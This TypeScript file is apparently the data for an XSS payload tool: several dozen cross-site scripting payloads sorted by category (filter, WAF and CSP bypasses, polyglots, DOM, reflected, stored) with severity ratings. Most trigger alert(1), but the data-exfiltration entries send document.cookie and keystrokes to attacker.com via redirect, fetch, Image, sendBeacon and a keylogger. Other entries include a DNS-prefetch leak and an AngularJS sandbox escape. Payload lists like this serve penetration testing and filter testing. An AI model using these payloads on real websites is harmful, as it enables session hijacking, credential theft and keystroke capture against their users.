export type Severity = 'low' | 'medium' | 'high' | 'critical';
export type Category = 'Basic' | 'Reflected' | 'Stored' | 'DOM-Based' | 'Event Handlers' | 'Filter Bypass' | 'WAF Bypass' | 'CSP Bypass' | 'Polyglots' | 'Data Exfil';

export interface Payload {
  id: string;
  content: string;
  category: Category;
  severity: Severity;
  description: string;
}

export const PAYLOADS: Payload[] = [
  // Basic
  { id: 'b1', content: '<script>alert(1)</script>', category: 'Basic', severity: 'medium', description: 'Standard script tag injection' },
  { id: 'b2', content: '<img src=x onerror=alert(1)>', category: 'Basic', severity: 'medium', description: 'Image tag with onerror handler' },
  { id: 'b3', content: '<svg onload=alert(1)>', category: 'Basic', severity: 'medium', description: 'SVG tag with onload handler' },
  { id: 'b4', content: '<body onload=alert(1)>', category: 'Basic', severity: 'medium', description: 'Body tag with onload handler' },
  { id: 'b5', content: '<iframe src="javascript:alert(1)"></iframe>', category: 'Basic', severity: 'medium', description: 'Iframe with javascript URI' },
  { id: 'b6', content: '<object data="javascript:alert(1)"></object>', category: 'Basic', severity: 'medium', description: 'Object tag data attribute' },
  { id: 'b7', content: '<embed src="javascript:alert(1)"></embed>', category: 'Basic', severity: 'medium', description: 'Embed tag src attribute' },
  { id: 'b8', content: '<link rel="stylesheet" href="javascript:alert(1)">', category: 'Basic', severity: 'medium', description: 'Link tag href execution (older browsers)' },
  { id: 'b9', content: '<iframe srcdoc="<svg onload=alert(1)>"></iframe>', category: 'Basic', severity: 'medium', description: 'Iframe with srcdoc attribute' },
  
  // Filter Bypass
  { id: 'fb1', content: '<ScRiPt>alert(1)</sCrIpT>', category: 'Filter Bypass', severity: 'high', description: 'Mixed case script tags' },
  { id: 'fb2', content: '<img src="x" oNerRor="alert(1)">', category: 'Filter Bypass', severity: 'high', description: 'Mixed case event handler' },
  { id: 'fb3', content: '"><script>alert(1)</script>', category: 'Filter Bypass', severity: 'high', description: 'Break out of attribute and inject script' },
  { id: 'fb4', content: '<scr<script>ipt>alert(1)</script>', category: 'Filter Bypass', severity: 'high', description: 'Nested script tags for filter evasion' },
  { id: 'fb5', content: '<<script>alert(1)//<</script>', category: 'Filter Bypass', severity: 'high', description: 'Malformed tag bypass' },
  { id: 'fb6', content: '<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>', category: 'Filter Bypass', severity: 'high', description: 'Hex encoded alert in handler' },
  { id: 'fb7', content: '<a href="jAvasCrIpt:alert(1)">Click</a>', category: 'Filter Bypass', severity: 'medium', description: 'Mixed case javascript protocol' },
  { id: 'fb8', content: '<xmp><p title="</xmp><svg/onload=alert(1)>">', category: 'Filter Bypass', severity: 'high', description: 'XMP tag abuse' },
  
  // Event Handlers
  { id: 'eh1', content: '<input autofocus onfocus=alert(1)>', category: 'Event Handlers', severity: 'high', description: 'Autofocus triggering onfocus' },
  { id: 'eh2', content: '<div onmouseover=alert(1)>hover me</div>', category: 'Event Handlers', severity: 'medium', description: 'Mouseover event' },
  { id: 'eh3', content: '<details ontoggle=alert(1) open>', category: 'Event Handlers', severity: 'high', description: 'Details tag ontoggle' },
  { id: 'eh4', content: '<marquee onstart=alert(1)>', category: 'Event Handlers', severity: 'low', description: 'Deprecated marquee onstart' },
  { id: 'eh5', content: '<video><source onerror=alert(1)>', category: 'Event Handlers', severity: 'high', description: 'Video source error' },
  { id: 'eh6', content: '<audio src=x onerror=alert(1)>', category: 'Event Handlers', severity: 'high', description: 'Audio load error' },
  { id: 'eh7', content: '<form><button formaction=javascript:alert(1)>X', category: 'Event Handlers', severity: 'high', description: 'Formaction attribute execution' },
  { id: 'eh8', content: '<b onmouseover=alert(1)>hover</b>', category: 'Event Handlers', severity: 'low', description: 'Bold tag mouseover' },
  { id: 'eh9', content: '<svg><animatetransform onbegin=alert(1)>', category: 'Event Handlers', severity: 'high', description: 'SVG animatetransform onbegin' },
  { id: 'eh10', content: '<w contenteditable onblur=alert(1)>Blur</w>', category: 'Event Handlers', severity: 'high', description: 'Contenteditable onblur' },
  
  // DOM-Based
  { id: 'db1', content: 'javascript:alert(1)', category: 'DOM-Based', severity: 'critical', description: 'Raw javascript protocol payload' },
  { id: 'db2', content: '#"><img src=x onerror=alert(1)>', category: 'DOM-Based', severity: 'high', description: 'Hash fragment injection' },
  { id: 'db3', content: '?-alert(1)-', category: 'DOM-Based', severity: 'high', description: 'Location search parameter injection for eval/setTimeout' },
  { id: 'db4', content: '\\\'-alert(1)//', category: 'DOM-Based', severity: 'high', description: 'Break out of single quoted JS string' },
  { id: 'db5', content: '\\"-alert(1)//', category: 'DOM-Based', severity: 'high', description: 'Break out of double quoted JS string' },
  { id: 'db6', content: 'var a=location.hash;eval(a.substring(1));', category: 'DOM-Based', severity: 'critical', description: 'Eval hash fragment directly' },
  
  // WAF Bypass
  { id: 'wb1', content: '<img/src=x onerror=alert(1)>', category: 'WAF Bypass', severity: 'critical', description: 'Slash instead of space' },
  { id: 'wb2', content: '<img src=x onerror="&#97;lert(1)">', category: 'WAF Bypass', severity: 'critical', description: 'HTML entity encoded alert' },
  { id: 'wb3', content: '%3Cscript%3Ealert%281%29%3C%2Fscript%3E', category: 'WAF Bypass', severity: 'critical', description: 'Full URL encoding' },
  { id: 'wb4', content: '<svg/onload=alert`1`>', category: 'WAF Bypass', severity: 'critical', description: 'Backticks instead of parentheses' },
  { id: 'wb5', content: '<script>setTimeout`alert\x281\x29`</script>', category: 'WAF Bypass', severity: 'critical', description: 'Hex escapes in script' },
  { id: 'wb6', content: 'javascript:alert%25281%2529', category: 'WAF Bypass', severity: 'critical', description: 'Double URL encoding' },
  { id: 'wb7', content: '<script>eval(atob("YWxlcnQoMSk="))</script>', category: 'WAF Bypass', severity: 'critical', description: 'Base64 encoded eval' },
  { id: 'wb8', content: '<script>setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))</script>', category: 'WAF Bypass', severity: 'critical', description: 'FromCharCode execution' },
  
  // Polyglots
  { id: 'p1', content: 'jaVasCript:/*-/*`/*`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>>', category: 'Polyglots', severity: 'critical', description: 'Multi-context XSS polyglot' },
  { id: 'p2', content: '">><script>alert(1)</script>', category: 'Polyglots', severity: 'critical', description: 'Simple double bracket escape' },
  { id: 'p3', content: '\'\';!--"<XSS>=&{()}', category: 'Polyglots', severity: 'medium', description: 'Syntax fuzzer string' },
  { id: 'p4', content: 'javascript://%250Aalert(1)', category: 'Polyglots', severity: 'critical', description: 'Protocol with encoded newline' },
  { id: 'p5', content: '1/n<img/src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4= onload=alert(1)>', category: 'Polyglots', severity: 'critical', description: 'Base64 SVG in img tag' },
  
  // CSP Bypass
  { id: 'cb1', content: '<script src="data:,alert(1)"></script>', category: 'CSP Bypass', severity: 'critical', description: 'Data URI script source' },
  { id: 'cb2', content: '<link rel=dns-prefetch href="//attacker.com">', category: 'CSP Bypass', severity: 'high', description: 'DNS prefetch exfiltration' },
  { id: 'cb3', content: '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script><div ng-app> {{constructor.constructor(\'alert(1)\')()}} </div>', category: 'CSP Bypass', severity: 'critical', description: 'AngularJS sandbox escape via CDN' },
  { id: 'cb4', content: '<object data="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+"></object>', category: 'CSP Bypass', severity: 'critical', description: 'Object tag with base64 data URI' },
  { id: 'cb5', content: '<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>', category: 'CSP Bypass', severity: 'critical', description: 'JSONP callback abuse' },
  
  // Data Exfil
  { id: 'de1', content: '<script>document.location=\'http://attacker.com/\'+document.cookie</script>', category: 'Data Exfil', severity: 'critical', description: 'Cookie theft via redirect' },
  { id: 'de2', content: '<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+btoa(document.cookie))">', category: 'Data Exfil', severity: 'critical', description: 'Cookie theft via fetch API' },
  { id: 'de3', content: '<script>new Image().src="http://attacker.com/?"+document.cookie;</script>', category: 'Data Exfil', severity: 'critical', description: 'Cookie theft via Image object' },
  { id: 'de4', content: '<script>navigator.sendBeacon("https://attacker.com/steal", document.cookie)</script>', category: 'Data Exfil', severity: 'critical', description: 'Cookie theft via sendBeacon' },
  { id: 'de5', content: '<script>document.addEventListener("keypress", function(e){ fetch("https://attacker.com/k?k="+e.key) });</script>', category: 'Data Exfil', severity: 'critical', description: 'Keylogger injection' },
  
  // Reflected
  { id: 'r1', content: '<script>alert(window.location.href)</script>', category: 'Reflected', severity: 'medium', description: 'Alerting current URL' },
  { id: 'r2', content: '"><svg/onload=alert(1)>', category: 'Reflected', severity: 'high', description: 'Escape quote and inject SVG' },
  { id: 'r3', content: '</title><script>alert(1)</script>', category: 'Reflected', severity: 'high', description: 'Break out of title tag' },
  { id: 'r4', content: '</textarea><script>alert(1)</script>', category: 'Reflected', severity: 'high', description: 'Break out of textarea tag' },
  { id: 'r5', content: '--><script>alert(1)</script>', category: 'Reflected', severity: 'high', description: 'Break out of HTML comment' },
  
  // Stored
  { id: 's1', content: '<img src="valid-image.jpg" onload="alert(1)">', category: 'Stored', severity: 'critical', description: 'Valid image with malicious onload' },
  { id: 's2', content: '<a href="javascript:alert(1)" id="profile-link">My Profile</a>', category: 'Stored', severity: 'critical', description: 'Malicious profile link' },
  { id: 's3', content: '<style>@import "http://attacker.com/xss.css";</style>', category: 'Stored', severity: 'high', description: 'External stylesheet import' },
  { id: 's4', content: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', category: 'Stored', severity: 'critical', description: 'Meta refresh to javascript URI' },
  { id: 's5', content: '<math><mi xlink:href="data:x,<script>alert(1)</script>"></mi></math>', category: 'Stored', severity: 'critical', description: 'Math tag payload' },
];